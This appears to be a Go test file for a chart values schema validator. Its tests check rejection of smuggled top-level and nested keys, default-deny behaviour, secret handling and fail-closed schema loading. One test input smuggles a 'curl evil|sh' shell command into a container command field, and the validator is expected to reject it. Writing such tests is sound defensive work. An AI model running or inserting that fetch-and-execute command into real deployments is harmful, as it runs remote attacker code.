package valuesschema

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// A representative chart schema: a required non-secret string with an enum, a
// typed nested object, a free-form nested map, and a required secret field.
const chartSchema = `{
  "type": "object",
  "properties": {
    "replicas":  {"type": "integer", "minimum": 1},
    "logLevel":  {"type": "string", "enum": ["debug", "info", "warn"]},
    "image": {
      "type": "object",
      "properties": {
        "repository": {"type": "string"},
        "tag":        {"type": "string"}
      }
    },
    "podAnnotations": {"type": "object"},
    "apiKey": {"type": "string", "format": "secret"}
  },
  "required": ["logLevel", "apiKey"]
}`

// codeSet returns the set of error codes present in a validation result.
func codeSet(t *testing.T, values string, secretInputs map[string]string) (codesFound []string, fatal error) {
	t.Helper()
	errs, fatal := Validate([]byte(chartSchema), json.RawMessage(values), secretInputs)
	for _, e := range errs {
		codesFound = append(codesFound, e.Code)
	}
	return codesFound, fatal
}

func TestValidate_HappyPath(t *testing.T) {
	errs, fatal := Validate(
		[]byte(chartSchema),
		json.RawMessage(`{"logLevel":"info","replicas":3,"image":{"repository":"ghcr.io/acme/app","tag":"1.2.3"},"podAnnotations":{"team":"platform"}}`),
		map[string]string{"apiKey": "s3cr3t"},
	)
	require.NoError(t, fatal)
	assert.Empty(t, errs, "valid values must produce no errors")
}

func TestValidate_RejectsSmuggledTopLevelKey(t *testing.T) {
	// The core INPUTVAL-001 attack: inject an undeclared top-level key.
	codes, fatal := codeSet(t, `{"logLevel":"info","command":["/bin/sh","-c","curl evil|sh"]}`, map[string]string{"apiKey": "x"})
	require.NoError(t, fatal)
	assert.Contains(t, codes, "schema_violation", "undeclared top-level key must be rejected")
}

func TestValidate_RejectsSmuggledNestedKey(t *testing.T) {
	// image declares properties, so it defaults to deny — an undeclared nested
	// key (e.g. overriding the container command) must be rejected.
	codes, fatal := codeSet(t, `{"logLevel":"info","image":{"repository":"x","command":["evil"]}}`, map[string]string{"apiKey": "x"})
	require.NoError(t, fatal)
	assert.Contains(t, codes, "schema_violation", "undeclared nested key must be rejected")
}

func TestValidate_AllowsFreeFormNestedMap(t *testing.T) {
	// podAnnotations is an object with no declared properties → intentionally
	// free-form, arbitrary keys allowed.
	errs, fatal := Validate(
		[]byte(chartSchema),
		json.RawMessage(`{"logLevel":"info","podAnnotations":{"any":"value","another":"ok"}}`),
		map[string]string{"apiKey": "x"},
	)
	require.NoError(t, fatal)
	assert.Empty(t, errs)
}

func TestValidate_TypeAndEnum(t *testing.T) {
	t.Run("type mismatch", func(t *testing.T) {
		codes, fatal := codeSet(t, `{"logLevel":"info","replicas":"three"}`, map[string]string{"apiKey": "x"})
		require.NoError(t, fatal)
		assert.Contains(t, codes, "schema_violation")
	})
	t.Run("enum violation", func(t *testing.T) {
		codes, fatal := codeSet(t, `{"logLevel":"verbose"}`, map[string]string{"apiKey": "x"})
		require.NoError(t, fatal)
		assert.Contains(t, codes, "schema_violation")
	})
}

func TestValidate_RequiredNonSecretMissing(t *testing.T) {
	codes, fatal := codeSet(t, `{"replicas":2}`, map[string]string{"apiKey": "x"})
	require.NoError(t, fatal)
	assert.Contains(t, codes, "schema_violation", "missing required logLevel must be reported")
}

func TestValidate_SecretHandling(t *testing.T) {
	t.Run("secret in values is rejected", func(t *testing.T) {
		codes, fatal := codeSet(t, `{"logLevel":"info","apiKey":"leaked"}`, map[string]string{"apiKey": "x"})
		require.NoError(t, fatal)
		assert.Contains(t, codes, "secret_in_values")
	})
	t.Run("required secret missing from secret_inputs", func(t *testing.T) {
		codes, fatal := codeSet(t, `{"logLevel":"info"}`, map[string]string{})
		require.NoError(t, fatal)
		assert.Contains(t, codes, "required_secret_missing")
	})
	t.Run("required secret present passes", func(t *testing.T) {
		errs, fatal := Validate([]byte(chartSchema), json.RawMessage(`{"logLevel":"info"}`), map[string]string{"apiKey": "x"})
		require.NoError(t, fatal)
		assert.Empty(t, errs)
	})
}

func TestValidate_NonObjectValues(t *testing.T) {
	t.Run("array", func(t *testing.T) {
		errs, fatal := Validate([]byte(chartSchema), json.RawMessage(`["nope"]`), nil)
		require.NoError(t, fatal)
		require.Len(t, errs, 1)
		assert.Equal(t, "invalid_type", errs[0].Code)
	})
	t.Run("malformed json", func(t *testing.T) {
		errs, fatal := Validate([]byte(chartSchema), json.RawMessage(`{not json`), nil)
		require.NoError(t, fatal)
		require.Len(t, errs, 1)
		assert.Equal(t, "invalid_json", errs[0].Code)
	})
}

func TestValidate_EmptySchemaIsDefaultDeny(t *testing.T) {
	// INPUTVAL-002 regression: a propertyless schema must NOT mean "anything
	// goes". Empty values pass; any submitted value is rejected.
	t.Run("empty values pass", func(t *testing.T) {
		errs, fatal := Validate([]byte(`{}`), json.RawMessage(`{}`), nil)
		require.NoError(t, fatal)
		assert.Empty(t, errs)
	})
	t.Run("any value rejected", func(t *testing.T) {
		errs, fatal := Validate([]byte(`{}`), json.RawMessage(`{"anything":"goes"}`), nil)
		require.NoError(t, fatal)
		assert.NotEmpty(t, errs, "propertyless schema must reject submitted values")
	})
	t.Run("type:object without properties still default-denies", func(t *testing.T) {
		errs, fatal := Validate([]byte(`{"type":"object"}`), json.RawMessage(`{"x":1}`), nil)
		require.NoError(t, fatal)
		assert.NotEmpty(t, errs)
	})
}

func TestValidate_AuthorAdditionalPropertiesTrueIsOverriddenAtTopLevel(t *testing.T) {
	// A chart author cannot reopen the smuggling hole by declaring
	// additionalProperties:true at the top level.
	schema := `{"type":"object","properties":{"a":{"type":"string"}},"additionalProperties":true}`
	errs, fatal := Validate([]byte(schema), json.RawMessage(`{"a":"ok","smuggled":"value"}`), nil)
	require.NoError(t, fatal)
	assert.NotEmpty(t, errs, "top-level additionalProperties:true must be overridden")
}

func TestValidate_FailsClosedOnUnenforceableSchema(t *testing.T) {
	t.Run("empty schema bytes", func(t *testing.T) {
		_, fatal := Validate([]byte(``), json.RawMessage(`{}`), nil)
		assert.Error(t, fatal, "empty schema must fail closed")
	})
	t.Run("non-object schema", func(t *testing.T) {
		_, fatal := Validate([]byte(`[]`), json.RawMessage(`{}`), nil)
		assert.Error(t, fatal)
	})
	t.Run("invalid json schema", func(t *testing.T) {
		_, fatal := Validate([]byte(`{not valid`), json.RawMessage(`{}`), nil)
		assert.Error(t, fatal)
	})
}

func TestEnforceable(t *testing.T) {
	cases := []struct {
		name    string
		schema  string
		wantErr bool
	}{
		{"valid object schema", chartSchema, false},
		{"empty object schema", `{}`, false},
		{"type object", `{"type":"object"}`, false},
		{"empty bytes", ``, true},
		{"invalid json", `{nope`, true},
		{"non-object", `[1,2,3]`, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := Enforceable([]byte(tc.schema))
			if tc.wantErr {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}
